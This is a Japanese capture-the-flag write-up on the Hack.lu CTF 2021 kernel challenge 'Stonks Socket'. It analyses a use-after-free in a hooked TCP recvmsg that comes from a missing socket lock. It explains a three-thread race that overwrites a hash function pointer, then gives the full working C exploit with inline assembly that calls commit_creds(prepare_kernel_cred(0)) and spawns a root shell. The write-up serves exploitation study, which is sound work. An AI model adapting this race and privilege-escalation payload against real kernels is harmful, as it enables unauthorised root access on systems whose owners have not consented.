keywords
kernel exploit, race w/o uffd, shellcode

# イントロ

最近はどうも気分が沈みがちで、そんな楽しくない日々を送っております。こんにちは、ニートです。
いつぞや開催された**Hack.lu CTF 2021**。そのkernel問題である**Stonks Socket**を解いていきます。しんどいときには破壊と切り捨てと放置と放棄が大事です。

# overview / analysis

## static

リシテア曰く:

```lysithea-analysis.sh
===============================
Drothea v1.0.0
[.] kernel version:
  Linux version 5.11.0-38-generic (buildd@lgw01-amd64-041) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #1
[!] mmap_min_addr is smaller than 4096: 65536
[!] Oops doesn't mean panic.
  you mignt be able to leak info by invoking crash.
[!] SMEP is disabled.
[!] SMAP is disabled.
[!] unprivileged ebpf installation is enabled.
[-] unprivileged userfaultfd is disabled.
[?] KASLR seems enabled. Should turn off for debug purpose.
[?] kptr seems restricted. Should try 'echo 0 > /proc/sys/kernel/kptr_restrict' in init script.
Ingrid v1.0.0
[.] userfaultfd is not disabled.
[-] CONFIG_STRICT_DEVMEM is enabled.
===============================
```

まず、SMEP/SMAP無効でKASLR有効なのは良い。ついでにOopsでleakできるのもいい(但し今回の問題はshellをくれるのではなくバイナリをアップロードして勝手に実行される形式だった。けど、その中でシェル開けばいいだけだから、なんでこの形式かはわからんかった)。問題は、`userfaultfd`が、実装こそされているものの`unprivileged_userfaultfd`が禁止されていると言っている。めんど。これは持論なんですが、どうせレースが解法で且つ相当巧妙なタイミング操作が問題の肝とかでも無い限り、uffdを殺すのは悪だと思っています。めんどいだけなので。まぁ、ソースを配布しているから全部許します。ソース無配布>>>>>>>>>>>>>>深夜2時にどんちゃん騒ぎする上階のカス住人>>>>uffd殺しのorderで悪です。

## module overview

TCPプロトコルソケットの`ioctl`実装をオレオレ`ioctl`に置き換えている(厳密には、内部で`super`しているため置き換えていると言うよりもプリフックしている)。

![](https://i.imgur.com/pLs12oC.png)

本モジュールはソケットから`recvmsg()`する際に、メッセージのハッシュをバッファ末尾に付与するというのがメイン機能になっている。その実現のため、`recvmsg()`自体をカスタムのものに置き換えている。

```stonks_ioctl.c
int stonks_ioctl(struct sock *sk, int cmd, unsigned long arg) {
    int err;
    u64 *sks = (u64*)sk;
    ...
    if (cmd == OPTION_CALL) { 
    ...
    sk->sk_user_data = stonks_sk;
    // replace `recvmsg` function with custom one
    sk->sk_prot->recvmsg = stonks_rocket;
    return err;
    ...
```

こいつの実装はこんな感じで、内部で本来の`tcp_recvmsg()`を呼びつつ、その後に独自の`hash_function()`でハッシュを生成してメッセージバッファに入れている。わざわざ関数ポインタ使ってるね、怪しいね。一応建前はハッシュ関数を選択できるようにらしいけどね。うん。

![](https://i.imgur.com/fMh2a0Y.png)

ハッシュ関数はこんな感じ。ソケットに入ってきたメッセージを、ユーザが指定した`length` qword毎に区切ってバッファに入れて、どんどんXORしていく簡単な実装。

![](https://i.imgur.com/zJsoWQf.png)


お試しで以下のコードを実行すると、ちゃんと末尾にハッシュっぽいのが付与されているのが分かる。

```test.c
  // write to socket from client
  write(csock, "ABCDEFG", 8);
  option_arg_t option = {
    .size = 0x4,
    .rounds = 1,
    .key = 0xdeadbeef,
    .security = 1,
  };
  assert(ioctl(psock, OPTION_CALL, &option) == 0);
  char bbuf[0x30] = {0};
  recv(psock, bbuf, 0x30, 0);
  puts("[.] received");
  printf("%s\n", bbuf);
  hexdump(bbuf, 0x30);
}
```

![](https://i.imgur.com/wFuTFEj.png)


# vulns

まぁ全体的にバギーなプログラムではある。`length`をいじることで`secure_hash()`でスタックが溢れるうえに、oopsがpanicではないから敢えてoopsさせてleakさせるのもできる。他にも適当にモンキーテストしてたら簡単にクラッシュするパスも見つかったが、大して使えそうにはなかったため忘れてしまった。


![](https://i.imgur.com/9W6OO72.png)


一番の問題は、`struct sock`のロックを取っていないこと。本来の実装である`tcp_recvmsg()`では、内部関数を呼ぶ前にちゃんと　ソケットのロックを取っている。

```net/ipv4/tcp.c
int tcp_recvmsg(struct sock *sk, struct msghdr *msg, size_t len, int nonblock,
		int flags, int *addr_len)
{
    ...
	lock_sock(sk);
	ret = tcp_recvmsg_locked(sk, msg, len, nonblock, flags, &tss,
				 &cmsg_flags);
	release_sock(sk);
    ...
}
EXPORT_SYMBOL(tcp_recvmsg);
```

だが、本モジュールではあろうことか`sk->sk_user_data`をスタックに積んでロックもとらず放置してしまっている。いわゆるパッチ問(この問題もフックをつけてるだけだからある種のパッチ問だと思う)においては、本来の実装と違うところがバグである。
この`sk_user_data`には、先程言ったハッシュを生成するためのユーザ指定の情報(関数ポインタのみユーザ指定不可)が入っており、`tcp_recvmsg()`後にスタックに積んだ`sk_user_data`から情報を取り出して使っている。このデータは`ioctl`で`kfree`できるため、無事にUAF完成。


# race

さてさて、最初に書いたように`unprivileged_userfualtfd`が禁止されている。よって、結構シビアなレースをする必要が有る。最初は`sendmsg`で任意サイズのsprayをしようとしていたが、`sendmsg`でのspray、一回も成功したこと無くて断念した。これ、ほんとに使える???

こういう場合に安定なのは、モジュール内で実装されている関数・構造体をレースに使うこと。victimとなる構造体は`struct StonksSocket`で、サイズは`0x20`。

まず、クライアント1(victim)のソケットを開いて`ioctl`して`StonksSocket`を作る。次に、同一サーバに対してクライアント2(attacker)のソケットを作り、同様に`ioctl`して`StonksSocket`を作り、先にクソデカメッセージを送っておく。まだ`recv`はしない。

ここでスレッドを他に2つ作る。receiverスレッドでは、起動と同時にvictimの`StonksSocket`を削除して、その後attackerから永遠に`recv`し続ける。
```receiver.c
static void *receiver(void *arg) {
  puts("[+] receiver thread started");
  while(GO == 0);
  ioctl(victim_sock_fd, OPTION_PUT, NULL);
  while(1 == 1) {
    recv(attacker_sock_fd, bigrcvbuf, BIGSIZE, 0);
  }
  return NULL;
}
```

writerスレッドでは、一度だけvictimに対して`write`をする。このデータはなんでもいい。
```writer.c
static void *writer(void *arg) {
  puts("[+] writer thread started");
  usleep(1500 * 1000);
  GO=1;
  for (int ix = 0; ix != 30; ++ix) {
    usleep(1);
  }
  write(victim_socket, bigbuf, 8);
}
```

最後に、メインスレッドでは一度だけvictimから`read`する。


これらがうまく噛み合って以下の順で起こると、レースが起こる:
1. メインスレッドがvictimからreadする。`stonks_rocket()`内で、`sk_user_data`ポインタをスタックに積む。読むのはクソデカバッファだから、`tcp_recvmsg()`内でコンテキストスイッチする(しろ)。
2. readerスレッドがvictimの`StonksSocket`を`kfree`する。これでvictimのスタックに乗っている`sk_user_data`はダングリング。
3. readerスレッド内でattackerから`recv`することで、`secure_hash`内の以下のパスで、victimがリリースした直後の0x20サイズのチャンク(`StonksSocket`)がとられ、kUAF(overwrite)。
```.c
    while (i) {
        size = h->length * sizeof(u64);
        buf = kmalloc(size, GFP_KERNEL);
        i = copy_from_iter(buf, size, msg);
        for (j = 0; j < i; j++) {
            hash[j] ^= buf[j];
        }
        kfree(buf);
    }
```
4. writerスレッド内でvictimにwriteすることで、メインスレッドの`recv`の処理が続行する。このときには、3により`sk_user_data->hash_function`関数ポインタがattackerにより送られたメッセージの値で上書きされている。
5. メインスレッド内の`recv`が、通常の`tcp_recvmsg()`を終えて書き換えられたハッシュ関数を呼び出す。
6. nirugiri


かなり調整がシビアで、writerスレッドとメインスレッドでスリープを挟んで微調整をしながら上手くいかないなぁと嘆いていたけど、**クソデカバッファのサイズをクソデカからクソデカデカデカデカにしたら上手くいった**。力こそ正義。


# LPE

SMEPもSMAPも無効だから、RIPを取ればもう終わり。RIPが取れた時のスタックを眺めて、使えそうなシンボルをスタックから見繕って`commit(kpc(0))`した。


# exploit

```exploit.c
// for exploit.h, refer to https://github.com/smallkirby/lysithea

#include "exploit.h"
#include <sched.h>

/*********** commands ******************/

#define DEV_PATH ""   // the path the device is placed
#define u64 ulong
typedef union {
    // for OPTION_DEBUG
    struct {
        u64 off;
        u64 *data;
    };
    // for OPTION_CALL
    struct {
        unsigned size;
        u64 rounds;
        u64 key;
        u64 security;
    };
} option_arg_t;

#define OPTION_CALL     0x1337
#define OPTION_PUT      0x1338
#define OPTION_DEBUG    0x1339

/*********** constants ******************/

#define PORT 49494
#define BIGSIZE 0x80000
int victim_sock_fd = -1, attacker_sock_fd = -1;
int victim_socket, attacker_socket;
char bigbuf[BIGSIZE] = {0};
char bigrcvbuf[BIGSIZE] = {0};
const option_arg_t call_option_security = {
    .size = 0x4,
    .rounds = 1,
    .key = 0xdeadbeef,
    .security = 1,
};
const option_arg_t call_option_empty = {
    .size = 0x4,
    .rounds = 1,
    .key = 0xdeadbeef,
    .security = 0,
};
int GO = 0;

/****** (END constants) *****************/

#define DIFF_PREPARE_KERNEL_CRED 0x38f4b
#define DIFF_COMMIT_CREDS 0x3944b

void nirugiri()
{
  asm(
    "mov rax, [rsp+0x28]\n"
    "sub rax, 0x38f4b\n"
    "xor rdi, rdi\n"
    "call rax\n"
    "mov rdi, rax\n"
    "mov rax, [rsp+0x28]\n"
    "sub rax, 0x3944b\n"
    "call rax\n"
    //"mov rax, [0xaaa]\n" // PROBE
    "leave\n"
    "ret\n"
  );
}


int listenat(int port) {
  printf("[.] creating listening socket @ %d ...\n", port);
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  assert(sock != -1);
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  assert(bind(sock, (struct sockaddr*)&addr, sizeof(addr)) != -1);
  assert(listen(sock, 999) == 0);

  return sock;
}

int connectto(int port) {
  puts("[.] creating client socket");
  int csock = socket(AF_INET, SOCK_STREAM, 0);
  assert(csock != -1);
  struct sockaddr_in caddr;
  memset(&caddr, 0, sizeof(caddr));
  caddr.sin_family = AF_INET;
  caddr.sin_port = htons(port);
  caddr.sin_addr.s_addr = inet_addr("127.0.0.1");
  assert(connect(csock, &caddr, sizeof(caddr)) == 0);

  return csock;
}

static void *receiver(void *arg) {
  puts("[+] receiver thread started");
  while(GO == 0);
  ioctl(victim_sock_fd, OPTION_PUT, NULL);
  while(1 == 1) {
    recv(attacker_sock_fd, bigrcvbuf, BIGSIZE, 0);
  }
  return NULL;
}

static void *writer(void *arg) {
  puts("[+] writer thread started");
  usleep(1500 * 1000);
  GO=1;
  for (int ix = 0; ix != 30; ++ix) {
    usleep(1);
  }
  write(victim_socket, bigbuf, 8);
}

int main(int argc, char *argv[]) {
  puts("[.] exploit started.");
  printf("[+] nirugiri @ %p\n", nirugiri);

  // create receiver socket
  int server_socket = listenat(PORT);
  struct sockaddr peer_addr;
  unsigned len = sizeof(peer_addr);

  // connect to the socket
  puts("[+] requesting connection");
  victim_socket = connectto(PORT);
  attacker_socket = connectto(PORT);

  // accept victim and set hash filter
  puts("[+] accepting victim connection");
  assert((victim_sock_fd = accept(server_socket, &peer_addr, &len)) != -1);
  assert(ioctl(victim_sock_fd, OPTION_CALL, &call_option_empty) == 0);

  // accept attacker connection and set evil hash filter
  puts("[+] accepting attacker connection and setting hashes");
  for (int ix = 0; ix != BIGSIZE / 8; ++ix) {
    ((ulong*)bigbuf)[ix] = (ulong)nirugiri;
  }
  assert((attacker_sock_fd = accept(server_socket, &peer_addr, &len)) != -1);
  assert(ioctl(attacker_sock_fd, OPTION_CALL, &call_option_security) == 0);
  assert(write(attacker_socket, bigbuf, BIGSIZE) != -1);

  /*** invoke race ***
  * the main point is, operations is done in exact order below;
  *
  * 1. victim recv() start, which takes much time to read huge buf
  * 2. attacker StonksSocket is put
  * 3. attacker recv() is done, which means overwrite of victim Socket
  * 4. end reading of victim buf, which leads to hash_function(), in this case nirugiri()
  ***/
  puts("[+] starting race...");
  pthread_t receiver_thr, writer_thr;
  pthread_create(&receiver_thr, NULL, receiver, NULL);
  pthread_create(&writer_thr, NULL, writer, NULL);
  for (int ix = 0; ix != 100; ++ix) {
    usleep(50);
  }
  recv(victim_sock_fd, bigrcvbuf, 0x100, 0);

  sleep(1);
  if (getuid() != 0) {
    puts("\n[FAIL] couldn't get root...");
    exit(1);
  } else {
    puts("\n\n[SUCCESS] enjoy your root.");
    system("/bin/sh");
  }

  // end of life (UNREACHABLE)
  puts("[ ] END of life...");
  sleep(9999);
}
```


# アウトロ

![](https://i.imgur.com/cOv3Pec.png)


uffd殺さなくても良かったんじゃないでしょうか。


早く大学4年が終わってほしみが深くてぴえん超えてぱおんです。風花雪月は4周目がそろそろ終わります。


# 参考
kernelpwn
https://github.com/smallkirby/kernelpwn
lysithea
https://github.com/smallkirby/lysithea
ニルギリ
https://youtu.be/yvUvamhYPHw

